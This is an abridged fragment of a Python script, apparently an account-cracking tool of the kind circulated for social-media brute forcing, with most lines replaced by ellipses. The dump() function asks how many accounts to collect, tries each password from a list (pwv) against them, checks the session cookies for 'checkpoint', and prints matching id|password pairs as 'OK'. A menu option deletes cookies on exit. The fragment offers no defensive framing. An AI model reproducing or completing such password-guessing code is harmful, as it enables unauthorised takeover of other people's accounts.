...
def menu():
	...
	if ham in ['0']:
		...
		print('[•] success exit and delete cookies ')
		exit()
	else:
...
def dump():    
	...
	try:
		...
		print(f'{P}[•• ────────────────────────────────────────── ••]')
		kumpulkan = int(input(f'[•] How manny : '))
		print(f'{P}[•• ────────────────────────────────────────── ••]')
	except ValueError:
	    exit()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				print(f'\r{x}{P}[ {H}OK {P}] {H}{idf}|{pw}{N}')
